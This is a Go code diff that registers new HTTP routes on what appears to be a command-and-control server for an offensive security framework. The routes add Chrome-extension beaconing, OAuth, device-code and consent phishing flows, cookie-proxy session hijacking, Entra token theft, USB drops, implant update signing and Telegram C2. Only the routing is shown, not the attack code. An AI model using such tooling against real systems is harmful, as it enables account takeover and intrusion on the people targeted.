@@ -24,6 +24,7 @@ func (s *Server) registerPublicRoutes() {
 	// Public phishing landing (credential capture) — no auth by design
 	s.router.GET("/phishing/l/:token", s.handlePhishingLanding)
 	s.router.POST("/phishing/l/:token", middleware.RequestBodyLimit(MaxJSONBodySize), s.handlePhishingLanding)
+	s.router.GET("/phishing/oauth/callback", s.handleOAuthCallback)
 
 	// WebSocket endpoints: auth handled inside the handler (via cookie/query token)
 	// to avoid redirect loops and support cookie-less connections.
@@ -32,6 +33,13 @@ func (s *Server) registerPublicRoutes() {
 	s.router.GET("/ws/beacon", wsRateLimiter.Limit(), s.handleWebSocketBeacon)
 	s.router.GET("/extc2/ws", wsRateLimiter.Limit(), s.handleExternalC2WebSocket)
 	s.router.GET("/ws/operator", wsRateLimiter.Limit(), s.handleOperatorWS)
+
+	// Chrome extension C2: public beacon + packaged extension download.
+	// Auth is the optional derived chrome token (see handleChromeBeacon),
+	// matching the implant beacon's unauthenticated check-in contract.
+	chromeBeaconLimiter := middleware.NewRateLimiter(s.ctx, BeaconRateLimit, BeaconRateWindow)
+	s.router.POST("/api/chrome/beacon", middleware.RequestBodyLimit(MaxJSONBodySize), chromeBeaconLimiter.Limit(), s.handleChromeBeacon)
+	s.router.GET("/forgec2-chrome-c2.zip", chromeBeaconLimiter.Limit(), s.handleChromeExtensionZip)
 }
 
 // registerAgentRoutes registers dashboard, search, and agent CRUD routes.
@@ -56,6 +64,7 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsRead.GET("/api/agents", s.handleListAgents)
 		agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
 		agentsRead.GET("/api/agents/:id/screenshots", s.handleListAgentScreenshots)
+		agentsRead.GET("/api/agents/:id/timeline", s.handleAgentTimeline)
 		agentsRead.GET("/agents/:id/token", s.handleTokenPage)
 		agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
 		agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
@@ -63,11 +72,20 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsRead.GET("/agents/:id/config", s.handleGetAgentConfig)
 		agentsRead.GET("/agents/:id/chain", s.handleAgentChainGet)
 		agentsRead.GET("/agents/:id/status-history", s.handleAgentStatusHistory)
+		agentsRead.GET("/api/ai/pending-tasks", s.handleAIPendingTasks)
+		agentsRead.GET("/api/ai/status", s.handleAIStatus)
+		agentsRead.POST("/api/ai/analyze-result", s.handleAIAnalyzeResult)
+		agentsRead.POST("/api/ai/suggest-next-steps", s.handleAISuggestNextSteps)
+		agentsRead.POST("/api/ai/nl-query", s.handleAINLQuery)
+		agentsRead.POST("/api/ai/generate-playbook", s.handleAIGeneratePlaybook)
+		agentsRead.GET("/api/handover/export", s.handleHandoverExport)
+		agentsRead.GET("/api/scheduler/oneshot", s.handleListOneShotTasks)
 	}
 
 	agentsWrite := auth.Group("/")
 	agentsWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
 	{
+		agentsWrite.POST("/api/ai/save-playbook", s.handleAISavePlaybook)
 		agentsWrite.POST("/agents/:id/kill", s.handleKillAgent)
 		agentsWrite.POST("/agents/:id/note", s.handleUpdateNote)
 		agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
@@ -83,6 +101,8 @@ func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
 		agentsWrite.POST("/agents/:id/chain/clear", s.handleAgentChainClear)
 		agentsWrite.POST("/agents/:id/kill_date", s.handleSetKillDate)
 		agentsWrite.DELETE("/agents/:id/kill_date", s.handleClearKillDate)
+		agentsWrite.POST("/agents/:id/block", s.handleBlockAgent)
+		agentsWrite.DELETE("/agents/:id/block", s.handleUnblockAgent)
 	}
 	agentsDelete := auth.Group("/")
 	agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
@@ -111,6 +131,7 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/clipboard/get", s.handleClipboardGet)
 		agentCmd.POST("/clipboard/set", s.handleClipboardSet)
 		agentCmd.POST("/find", s.handleFindFiles)
+		agentCmd.POST("/hostinfo", s.handleRequestHostInfo)
 		agentCmd.POST("/reg/get", s.handleRegGet)
 		agentCmd.POST("/reg/set", s.handleRegSet)
 		agentCmd.POST("/reg/delete", s.handleRegDelete)
@@ -138,6 +159,7 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/set_sleep_mask_advanced", s.handleSetSleepMaskAdvanced)
 		agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
 		agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
+		agentCmd.GET("/inject/methods", s.handleInjectMethods)
 		agentCmd.POST("/kerberoast", s.handleKerberoast)
 		agentCmd.POST("/password_spray", s.handlePasswordSpray)
 		agentCmd.POST("/cred_check", s.handleCredCheck)
@@ -149,6 +171,23 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/bof", s.handleBOF)
 		agentCmd.POST("/browser_steal", s.handleBrowserSteal)
 		agentCmd.POST("/cookie_export", s.handleCookieExport)
+		agentCmd.POST("/cookie_proxy/start", s.handleCookieProxyStart)
+		agentCmd.POST("/cookie_proxy/stop", s.handleCookieProxyStop)
+		agentCmd.GET("/cookie_proxy", s.handleCookieProxyStatus)
+		agentCmd.GET("/cookie_proxy/jar", s.handleCookieProxyJar)
+		agentCmd.GET("/cookie_proxy/netscape", s.handleCookieProxyNetscape)
+		agentCmd.POST("/sccm_recon", s.handleSccmRecon)
+		agentCmd.POST("/entra_prt", s.handleEntraPRT)
+		agentCmd.POST("/file_hunt", s.handleFileHunt)
+		agentCmd.POST("/screen_trigger/start", s.handleScreenTriggerStart)
+		agentCmd.POST("/screen_trigger/stop", s.handleScreenTriggerStop)
+		agentCmd.POST("/usb_enum", s.handleUSBEnum)
+		agentCmd.POST("/usb_drop", s.handleUSBDrop)
+		agentCmd.POST("/browser_history", s.handleBrowserHistory)
+		agentCmd.POST("/session_recon", s.handleSessionRecon)
+		agentCmd.POST("/tun/start", s.handleTunStart)
+		agentCmd.POST("/tun/stop", s.handleTunStop)
+		agentCmd.GET("/tun", s.handleTunStatus)
 		agentCmd.POST("/vpn_creds", s.handleVpnCreds)
 		agentCmd.POST("/creds", s.handleCredsDump)
 		agentCmd.POST("/wifi_creds", s.handleWifiCreds)
@@ -211,10 +250,12 @@ func (s *Server) registerGenerateRoutes(auth *gin.RouterGroup) {
 		genRead.GET("/generate/builds", s.handleBuildList)
 		genRead.GET("/generate/builds/:id", s.handleBuildStatus)
 		genRead.GET("/generate/builds/:id/download", s.handleBuildDownload)
+		genRead.GET("/api/builds/effectiveness", s.handleBuildEffectiveness)
 	}
 	genWrite := auth.Group("/")
 	genWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
 	{
+		genWrite.POST("/api/generate/profile", s.handleSaveProfile)
 		genWrite.POST("/api/generate/profile/import", s.handleImportProfile)
 		genWrite.DELETE("/api/generate/profile/:name", s.handleDeleteProfile)
 		genWrite.POST("/generate/exe", s.handleGenerateEXE)
@@ -227,6 +268,7 @@ func (s *Server) registerGenerateRoutes(auth *gin.RouterGroup) {
 		genWrite.POST("/generate/one-liner", s.handleGenerateOneLiner)
 		genWrite.POST("/generate/donut", s.handleGenerateDonut)
 		genWrite.POST("/generate/shellcode", s.handleGenerateShellcode)
+		genWrite.POST("/generate/delivery", s.handleGenerateDelivery)
 	}
 }
 
@@ -235,10 +277,11 @@ func (s *Server) registerListenerRoutes(auth *gin.RouterGroup) {
 	listenersRead := auth.Group("/")
 	listenersRead.Use(middleware.RequirePermission(db.PermListenersRead))
 	{
-		listenersRead.GET("/listeners", s.handleListenersPage)
-		listenersRead.GET("/listeners/:id", s.handleListenerDetail)
-		listenersRead.GET("/api/listeners", s.handleListListeners)
-		listenersRead.GET("/api/listeners/:id", s.handleAPIGetListener)
+	listenersRead.GET("/listeners", s.handleListenersPage)
+	listenersRead.GET("/listeners/:id", s.handleListenerDetail)
+	listenersRead.GET("/api/listeners", s.handleListListeners)
+	listenersRead.GET("/api/listeners/health", s.handleListenerHealth)
+	listenersRead.GET("/api/listeners/:id", s.handleAPIGetListener)
 	}
 	listenersWrite := auth.Group("/")
 	listenersWrite.Use(middleware.RequirePermission(db.PermListenersWrite))
@@ -294,12 +337,20 @@ func (s *Server) registerReconRoutes(auth *gin.RouterGroup) {
 		reconRead.GET("/api/report/network", s.handleAPIGetReportNetwork)
 		reconRead.GET("/api/report/findings", s.handleAPIGetReportFindings)
 		reconRead.GET("/api/report/history", s.handleAPIGetReportHistory)
+		reconRead.GET("/api/report/generated/:id", s.handleAPIGetGeneratedReport)
 		reconRead.GET("/api/report/export/html", s.handleAPIExportReportHTML)
 		reconRead.GET("/lateral", s.handleLateralPage)
 		reconRead.GET("/api/lateral/history/:id", s.handleLateralHistory)
 		reconRead.GET("/templates", s.handleTemplatesPage)
 		reconRead.GET("/api/templates", s.handleListTemplatesJSON)
 		reconRead.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)
+		macrosRead := auth.Group("/")
+		macrosRead.Use(middleware.RequirePermission(db.PermAgentsRead))
+		{
+			macrosRead.GET("/api/macros", s.handleListMacros)
+			macrosRead.GET("/api/macro-runs", s.handleListMacroRuns)
+			macrosRead.GET("/api/macro-runs/:id", s.handleGetMacroRun)
+		}
 	}
 	reconWrite := auth.Group("/")
 	reconWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
@@ -316,10 +367,23 @@ func (s *Server) registerReconRoutes(auth *gin.RouterGroup) {
 		reconWrite.POST("/toolkit/agents/:id/action", s.handleToolkitQuickAction)
 		reconWrite.POST("/api/report/generate", s.handleGenerateReport)
 		reconWrite.DELETE("/api/report/:id", s.handleAPIDeleteReport)
+		iocRead := auth.Group("/")
+		iocRead.Use(middleware.RequirePermission(db.PermAgentsRead))
+		{
+			iocRead.GET("/api/ioc", s.handleListIOCs)
+			iocRead.GET("/api/ioc/export", s.handleExportIOCs)
+		}
 		reconWrite.POST("/api/lateral/execute", s.handleAPILateralExecute)
 		reconWrite.POST("/api/templates", s.handleCreateTemplate)
 		reconWrite.PUT("/api/templates/:id", s.handleUpdateTemplate)
 		reconWrite.DELETE("/api/templates/:id", s.handleDeleteTemplate)
+		reconWrite.POST("/api/macros", s.handleCreateMacro)
+		reconWrite.PUT("/api/macros/:id", s.handleUpdateMacro)
+		reconWrite.DELETE("/api/macros/:id", s.handleDeleteMacro)
+		reconWrite.POST("/api/macros/:id/run", s.handleRunMacro)
+		reconWrite.POST("/api/macro-runs/:id/stop", s.handleStopMacroRun)
+		reconWrite.POST("/api/scheduler/oneshot", s.handleCreateOneShotTask)
+		reconWrite.DELETE("/api/scheduler/oneshot/:id", s.handleCancelOneShotTask)
 	}
 
 	auditRead := auth.Group("/")
@@ -376,6 +440,10 @@ func (s *Server) registerSettingsRoutes(auth *gin.RouterGroup) {
 		settingsWrite.POST("/settings/purge/tasks", middleware.RequireRole(db.RoleAdmin), s.handlePurgeTasks)
 		settingsWrite.POST("/settings/purge/audit", middleware.RequireRole(db.RoleAdmin), s.handlePurgeAuditLogs)
 		settingsWrite.POST("/settings/jwt/regenerate", middleware.RequireRole(db.RoleAdmin), s.handleRegenerateJWT)
+		// Update-signing trust root: admin-only, signatures authorise code
+		// execution on every pinned implant.
+		settingsWrite.GET("/update-signing/public-key", middleware.RequireRole(db.RoleAdmin), s.handleUpdateSigningKey)
+		settingsWrite.POST("/update-signing/sign", middleware.RequireRole(db.RoleAdmin), s.handleSignUpdate)
 		settingsWrite.POST("/settings/db/vacuum", s.handleDBVacuum)
 		settingsWrite.POST("/settings/db/backup", s.handleDBBackup)
 		// The raw database contains every secret (users, TOTP, API-key hashes,
@@ -430,6 +498,7 @@ func (s *Server) registerExtendedRoutes(auth *gin.RouterGroup) {
 		// Exposes server configuration internals — settings.read.
 		extRead.GET("/api/settings", middleware.RequirePermission(db.PermSettingsRead), s.handleAPISettings)
 		extRead.GET("/mesh/topology", s.handleAPIMeshTopology)
+		extRead.GET("/api/topology/network", s.handleAPINetworkTopology)
 		extRead.GET("/translations/stats", s.handleAPITranslationsStats)
 		extRead.GET("/api/privesc/results", s.handleAPIPrivesc)
 		extRead.GET("/timeline/events", s.handleAPITimelineData)
@@ -464,7 +533,22 @@ func (s *Server) registerExtendedRoutes(auth *gin.RouterGroup) {
 		extWrite.POST("/token/revert", s.handleAPITokenRevert)
 		extWrite.POST("/extc2/discord", s.handleConfigureDiscordC2)
 		extWrite.POST("/extc2/slack", s.handleConfigureSlackC2)
+		extWrite.POST("/extc2/telegram", s.handleConfigureTelegramC2)
 		extWrite.DELETE("/extc2/configs/:id", s.handleDeleteExtC2Config)
+	}
+
+	siemRead := auth.Group("/")
+	siemRead.Use(middleware.RequirePermission(db.PermSettingsRead))
+	{
+		siemRead.GET("/siem/rules", s.handleListSIEMRules)
+	}
+	siemWrite := auth.Group("/")
+	siemWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
+	{
+		siemWrite.POST("/siem/rules", s.handleCreateSIEMRule)
+		siemWrite.PUT("/siem/rules/:id", s.handleUpdateSIEMRule)
+		siemWrite.DELETE("/siem/rules/:id", s.handleDeleteSIEMRule)
+		siemWrite.POST("/siem/rules/:id/toggle", s.handleToggleSIEMRule)
 	}
 
 	groupsWrite := auth.Group("/")
@@ -508,6 +592,11 @@ func (s *Server) registerExtendedRoutes(auth *gin.RouterGroup) {
 		phishingWrite.POST("/phishing/campaigns/:id/launch", s.handleAPILaunchPhishingCampaign)
 		phishingWrite.POST("/phishing/campaigns/:id/stop", s.handleAPIStopPhishingCampaign)
 		phishingWrite.DELETE("/phishing/campaigns/:id", s.handleAPIDeletePhishingCampaign)
+		phishingWrite.POST("/api/identity/device-code", s.handleDeviceCodeStart)
+		phishingWrite.POST("/api/identity/device-code/:id/poll", s.handleDeviceCodePoll)
+		phishingWrite.POST("/api/identity/consent", s.handleConsentStart)
+		phishingWrite.GET("/api/identity/consent/:id", s.handleConsentStatus)
+		phishingWrite.POST("/api/identity/consent/:id/exchange", s.handleConsentExchange)
 	}
 
 	cbRead := auth.Group("/")
@@ -737,6 +826,7 @@ func (s *Server) registerCredentialRoutes(auth *gin.RouterGroup) {
 		credsWrite.POST("/credentials/add", s.handleAddCredential)
 		credsWrite.PUT("/credentials/:cred_id", s.handleUpdateCredential)
 		credsWrite.POST("/credentials/batch/tags", s.handleBatchAddTags)
+		credsWrite.POST("/credentials/batch/verify", s.handleBatchVerifyCredentials)
 		credsWrite.POST("/credentials/:cred_id/confirm", s.handleToggleConfirmed)
 		credsWrite.POST("/credentials/:cred_id/usage", s.apiRecordUsage)
 	}
@@ -753,6 +843,9 @@ func (s *Server) registerUserRoutes(auth *gin.RouterGroup) {
 	userRead.Use(middleware.RequirePermission(db.PermSettingsRead))
 	{
 		userRead.GET("/docs", s.handleDocsPage)
+		// Per-user saved list views (personal UI preference, any authenticated
+		// operator with settings read may use them).
+		userRead.GET("/api/saved-views", s.handleListSavedViews)
 		userRead.GET("/api/docs", s.handleAPIDocsRedirect)
 		userRead.GET("/api/docs/", s.handleAPIDocs)
 		userRead.GET("/api/docs/openapi.yaml", s.handleAPIDocsYAML)
@@ -768,6 +861,8 @@ func (s *Server) registerUserRoutes(auth *gin.RouterGroup) {
 	userWrite := auth.Group("/")
 	userWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
 	{
+		userWrite.POST("/api/saved-views", s.handleCreateSavedView)
+		userWrite.DELETE("/api/saved-views/:id", s.handleDeleteSavedView)
 		userWrite.POST("/ai/chat", s.handleAIChat)
 		userWrite.POST("/ai/config", s.handleAIConfig)
 		userWrite.POST("/ai/sessions", s.handleAISessionsCreate)
@@ -814,6 +909,7 @@ func (s *Server) registerCampaignRoutes(auth *gin.RouterGroup) {
 		campaignsRead.GET("/mitre/templates", s.handleMitreTemplates)
 		campaignsRead.GET("/mitre/timeline", s.handleMitreTimeline)
 		campaignsRead.GET("/mitre/phases", s.handleMitrePhases)
+		campaignsRead.GET("/api/mitre/heatmap", s.handleMitreHeatmap)
 		campaignsRead.GET("/attack/coverage", s.handleAttackCoverage)
 	}
 	campaignsWrite := auth.Group("/")
@@ -837,6 +933,19 @@ func (s *Server) registerCampaignRoutes(auth *gin.RouterGroup) {
 		notificationsWrite.PUT("/notifications/read-all", s.handleMarkAllNotificationsRead)
 		notificationsWrite.DELETE("/notifications/:id", s.handleDeleteNotification)
 		notificationsWrite.DELETE("/notifications", s.handleClearAllNotifications)
+		notificationRoutes := auth.Group("/")
+		notificationRoutes.Use(middleware.RequirePermission(db.PermSettingsRead))
+		{
+			notificationRoutes.GET("/api/notification-routes", s.handleListNotificationRoutes)
+		}
+		notificationRouteWrites := auth.Group("/")
+		notificationRouteWrites.Use(middleware.RequirePermission(db.PermSettingsWrite))
+		{
+			notificationRouteWrites.POST("/api/notification-routes", s.handleCreateNotificationRoute)
+			notificationRouteWrites.PUT("/api/notification-routes/:id", s.handleUpdateNotificationRoute)
+			notificationRouteWrites.DELETE("/api/notification-routes/:id", s.handleDeleteNotificationRoute)
+			notificationRouteWrites.POST("/api/notification-routes/:id/test", s.handleTestNotificationRoute)
+		}
 	}
 
 	redirectorRead := auth.Group("/")
